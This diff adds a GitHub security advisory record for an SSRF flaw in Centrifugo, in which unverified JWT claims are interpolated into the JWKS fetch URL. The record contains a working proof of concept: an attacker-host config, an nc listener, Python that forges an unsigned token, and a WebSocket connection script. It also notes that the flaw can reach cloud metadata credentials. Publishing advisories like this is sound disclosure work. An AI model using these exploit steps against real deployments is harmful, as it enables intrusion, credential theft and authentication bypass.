@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-j77h-rr39-c552",
+  "modified": "2026-03-14T09:17:47.228556Z",
+  "published": "2026-03-13T20:03:22Z",
+  "aliases": [
+    "CVE-2026-32301"
+  ],
+  "summary": "Centrifugo: SSRF via unverified JWT claims interpolated into dynamic JWKS endpoint URL",
+  "details": "### Summary\nCentrifugo is vulnerable to Server-Side Request Forgery (SSRF) when configured with a dynamic JWKS endpoint URL using template variables (e.g. `{{tenant}}`). An unauthenticated attacker can craft a JWT with a malicious `iss` or `aud` claim value that gets interpolated into the JWKS fetch URL **before the token signature is verified**, causing Centrifugo to make an outbound HTTP request to an attacker-controlled destination.\n\n### Details\nIn `internal/jwtverify/token_verifier_jwt.go`, the functions `VerifyConnectToken` and `VerifySubscribeToken` follow this flawed order of operations:\n1. Token is parsed without verification: `jwt.ParseNoVerify([]byte(t))`\n2. Claims are decoded from the unverified token\n3. `validateClaims()` runs — extracting named regex capture groups from \n   `issuer_regex`/`audience_regex` into `tokenVars` map using attacker-controlled \n   `iss`/`aud` claim values\n4. `verifySignatureByJWK(token, tokenVars)` is called — passing attacker-controlled \n   `tokenVars` to the JWKS manager\n5. In `internal/jwks/manager.go`, `fetchKey()` interpolates `tokenVars` directly \n   into the JWKS URL:\n   `jwkURL := m.url.ExecuteString(tokenVars)`\n6. Centrifugo makes an HTTP GET request to the attacker-controlled URL\n\nSuppressed the security linter on this line with an incorrect comment:\n`//nolint:gosec // URL is from server configuration, not user input.`\nThe URL is NOT purely from server configuration — it is partially constructed from unverified user-supplied JWT claims.\n\nSignature verification happens too late — after the SSRF has already fired.\n\n### PoC\n**Required config** (`config.json`):\n```json\n{\n  \"client\": {\n    \"token\": {\n      \"jwks_public_endpoint\": \"http://ATTACKER_HOST:8888/{{tenant}}/.well-known/jwks.json\",\n      \"issuer_regex\": \"^(?P[a-zA-Z0-9_-]+)\\\\.auth\\\\.example\\\\.com$\"\n    }\n  },\n  \"http_api\": { \"key\": \"test-api-key\" }\n}\n```\n\n**Step 1** — Start listener on attacker machine:\n```\nnc -lvnp 8888\n```\n\n**Step 2** — Generate malicious unsigned JWT:\n```python\nimport base64, json\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\nheader  = b'{\"alg\":\"RS256\",\"kid\":\"test-kid\",\"typ\":\"JWT\"}'\npayload = b'{\"sub\":\"attacker\",\"iss\":\"evil-tenant.auth.example.com\",\"exp\":9999999999}'\ntoken   = f\"{b64url(header)}.{b64url(payload)}.fakesig\"\nprint(token)\n```\n\n**Step 3** — Connect to Centrifugo WebSocket with the malicious token:\n```python\nimport websocket, json\nws = websocket.create_connection(\"ws://TARGET:8000/connection/websocket\")\nws.send(json.dumps({\"id\": 1, \"connect\": {\"token\": \"\"}}))\nprint(ws.recv())\n```\n\n**Step 4** — Observe incoming HTTP request on attacker listener:\n```\nGET /evil-tenant/.well-known/jwks.json HTTP/1.1\nHost: ATTACKER_HOST:8888\nUser-Agent: Go-http-client/1.1\n```\n\nMalicious token being crafted with suppress_origin=True bypassing the 403, and the token sent to Centrifugo:\n![1](https://github.com/user-attachments/assets/6fd5d5b8-f47a-4899-94db-931f52504808)\n\nCentrifugo Server Log:\n![2](https://github.com/user-attachments/assets/2e802648-8dc9-40d7-ac9e-f5f2ca19acad)\n\nnetcat terminal:\n![3](https://github.com/user-attachments/assets/854cfb19-ed0c-44e2-977a-efe2f9b6c50a)\n\n### Impact\n- **Unauthenticated SSRF** — No valid credentials required\n- Attacker can probe and access internal network services not exposed externally\n- On cloud deployments: access to metadata endpoints (AWS: `169.254.169.254`, GCP: `metadata.google.internal`) to steal IAM credentials\n- Attacker can serve a malicious JWKS response containing their own public key, causing Centrifugo to accept attacker-signed tokens as legitimate — leading to **full authentication bypass**\n- Exploitation requires `jwks_public_endpoint` to contain `{{...}}` template variables combined with `issuer_regex` or `audience_regex` — a configuration pattern explicitly documented and promoted by Centrifugo\n \n### Suggested Fix\n\n**1. Verify signature BEFORE extracting tokenVars (critical fix):**\nIn `token_verifier_jwt.go`, swap the order of operations:\n```go\n// CURRENT (vulnerable) order:\n// 1. ParseNoVerify\n// 2. validateClaims() → populates tokenVars from unverified claims\n// 3. verifySignature(token, tokenVars)  ← too late\n\n// FIXED order:\n// 1. ParseNoVerify\n// 2. verifySignature(token)  ← verify first with empty/nil tokenVars\n// 3. validateClaims() → only now extract tokenVars from verified claims\n// 4. If JWKS needed, re-verify with tokenVars using verified kid only\n```\n\n**2. Fix the incorrect nolint comment in `manager.go`:**\nRemove `//nolint:gosec // URL is from server configuration, not user input` The URL IS partially constructed from user input via JWT claims.\n\n**3. Alternative mitigation:**\nRestrict template variables to only the `kid` header field (which is not claim data) rather than allowing arbitrary claim values to influence the JWKS URL.\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/centrifugal/centrifugo/v6",
+        "purl": "pkg:golang/github.com/centrifugal/centrifugo/v6"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.7.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 6.6.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-j77h-rr39-c552/GHSA-j77h-rr39-c552.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/centrifugal/centrifugo/security/advisories/GHSA-j77h-rr39-c552"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/centrifugal/centrifugo"
+    }
+  ]
+}
